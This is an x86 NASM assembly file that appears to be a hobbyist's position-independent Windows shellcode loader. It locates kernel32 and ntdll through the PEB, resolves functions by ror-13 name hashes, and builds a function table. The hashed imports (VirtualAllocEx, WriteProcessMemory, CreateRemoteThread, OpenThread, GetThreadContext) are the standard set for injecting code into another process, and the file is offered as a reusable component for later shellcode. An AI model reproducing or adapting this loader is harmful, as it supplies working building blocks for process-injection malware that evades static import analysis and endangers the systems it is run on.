; ******************************************************************************************************
;This is sa7orimport for win32.
;
; Tools that were used to create this (all on my section of the wiki):
;	pe_hash.exe: create the hashes based on the function name.
; 	bin2shell.pl:  used with the "-t asmdd" option to perform byte refersing of 
;			nasm dd macro lines.
;
;*******************************************************************************************************
bits 32

section .text
	global _start	;normally this is only needed to export the "entry point" but: 
			;if we remove this and try to assemble
			;we get all kindsa errors, cuz nasm isnt able to calculate
			;the lengths for our 'jmp's, so our 'jmp short's result in errors.

_start:		; tell linker entry point, oh and also tell nasm the grow the fuck up
			; and learn how to calculate relative offsets like an adult.
	mov ebp, esp
	sub esp, byte 0xc	;sub esp, SIZEOF_BSS_IMPORTER	I need to find a way for nasm to calc and insert this value
	jmp GetHashDataAddr0	;jmp GetHashDataAddr0

	GetHashDataAddr1:
		pop esi
		mov [ebp-0xc], esi	;mov bss.pHashStart, esi...why not mov [esp], esi? 
		jmp short GetDoImportsAddr0	;jmp GetDoImportsAddr0

	GetDoImportsAddr1:
		pop edi 
		;Find kernel32 handle, walk through PEB module list to second entry
		mov eax, [fs:0x30] 	;PEB
		mov eax, [eax+0xc] 	;PEB_LDR_DATA
		mov eax, [eax+0x1c] 	;initorder link_entry in ldr_module for ntdll
		push byte 0x2		;number of ntdll imports !!!CHANGE THIS BASED ON YOUR HASH TABLE SIZE
		push dword [eax+0x8]	;ntdll handle
		mov eax, [eax]		;initorder, link_entry in ldr_module for kernel32.dll
		push byte 0xd 		;number of kernel32 imports 13
		push dword [eax+0x8]	;push Kernel32 base address
		call edi 		;call doImports
		;call edi 		;call doImports this second one got in here somehow
                        ;NOT have been in here.
		push 0x3233 		;pushes "user32" backwards
        push 0x52455355    ;part of above MUST BE ALL CAPS
		push esp
		mov eax, [ebp-0xc] 
		call dword [eax]	;call LoadLibraryA 
		push byte 0x1 		;number of imports from the dll we just pushed
		push eax  		;bss.pHashStart	
		call edi  		;call doImports 

		;we are finished now what ???
		jmp esi		;This jumpts the code beneath the function table.

	GetDoImportsAddr0:
		call GetDoImportsAddr1		;call GetDoImportsAddr1
	;module handle, count of hashes

	DoImports:
		push ebx
		mov ebx, [esp+0x8]
		mov edx, [esp+0xc]
		push edi
		;check to see if there are any more entries to read
	ImportNextEntry:
		test edx, edx
		jle short ImportsFinished	;jle ImportsFinished
		;read in next word
		lodsd
		mov [ebp-0x4], eax		;mov bss.HashToFind, eax
		push esi
		;GetHash
		mov edi, [ebx+0x3c]
		mov edi, [ebx+edi+0x78]		;edi = RVA of IMAGE_EXPORT_DIRECTORY struct
		add edi, ebx
		mov esi, [edi+0x20]
		add esi, ebx
		mov ecx, [edi+0x18]

	SearchForHash:
		lodsd
		add eax, ebx		;convert to absolute address
		;HASH FUNC START
		pushad
		mov esi, eax
		xor ecx, ecx
		mov edx, ecx
		mov eax, ecx
		dec ecx

	HashLoop:
		lodsb
		ror edx, byte 0xd
		add edx, eax
		test eax, eax               ;test if eax is 0
		jnz short HashLoop				;jnz HashLoop
		mov [ebp-0x8],edx			;mov bss.tmp32, edx
		popad
		;HASH FUNC END
		mov eax, [ebp-0x8]			;bss.tmp32
		cmp eax, [ebp-0x4]			;cmp eax, bss.HashtoFind
		jz short FoundHash				;je FoundHash
		loop SearchForHash			;SearchForHash

		;ALL searches for hash FAILED! how do we ever get here?
		xor eax, eax
		jmp short GetProcAddrByHashDone	;GetProcAddrByHash_Done

	FoundHash:
		mov eax, [edi+0x18]
		sub eax, ecx
		;Find ordinal number:
		mov esi, [edi+0x24]			;AddressOfNameOrdinals
		add esi, ebx				;convert to absolute cuz ebx dll base
		;movzx cx, [esi+eax*0x2]		;this line is FUCKED UP will break import
        mov cx, word [esi+eax*0x2]  ;fix for previous line, thnx Geoff.  ebp-4
                                    ; the hash we are looking for. eax
                                    ; ONE STEP AFTER: search hash @ebp-4
                                    ;                 ordinal == ecx
                                    ;                 dllbase == ebx
        nop                         ;padding for fix line above.
		mov esi, [edi+0x1c]
		add esi, ebx
		mov eax, [esi+ecx*0x4]
		add eax, ebx

	GetProcAddrByHashDone:
		pop esi
		mov [esi-0x4], eax
		dec edx
		jmp short ImportNextEntry

	ImportsFinished:
		pop edi ;some place inside us.
		pop ebx ;peb base!?
		ret 0x8 ;puts us back at that jump that jumps to beneath the
                ;newly created function table in: GetHashDataAddr0

	GetHashDataAddr0:
		call GetHashDataAddr1
		dd 0x74776072 ;//LoadLibraryA
		dd 0x65754077 ;//GetProcessHeap
		dd 0xbe077f14 ;//OpenProcess
		dd 0xace370d4 ;//VirtualAllocEx
		dd 0x550ec1eb ;//WriteProcessMemory
		dd 0xe6eb95ec ;//CreateRemoteThread
		dd 0x66e07461 ;//SuspendThread
		dd 0xbf60601c ;//GlobalAlloc
		dd 0x3e93453e ;//GetThreadContext
		dd 0xf37ac648 ;//OpenThread
		dd 0x0a137412 ;//IsBadReadPtr
		dd 0xc68be5ac ;//GetThreadSelectorEntry
		dd 0xd017306f ;//GetCurrentProcessId
        ;-------------- USER32
		dd 0x1545e26d ;//MessageBoxA
        ;-----
        ;The following is an attempt at returning ebp/esp to where they were when we
        ;started excuting
        ;cleanup: the pops on either side  pparently pad us against byte misalignment
        ;I dont really yet understand if it matters where esp is for the return.
        pop eax
        pop eax
        pop eax
        mov esi, [ebp-0xc] ;where the base of imported func-table happens to be
                           ;all shellcode after us needs to know this is where
                           ;the addy of the function table is.
        mov esp, ebp
        add ebp, byte 0x14
        pop eax
        pop eax
        pop eax
        pop eax       
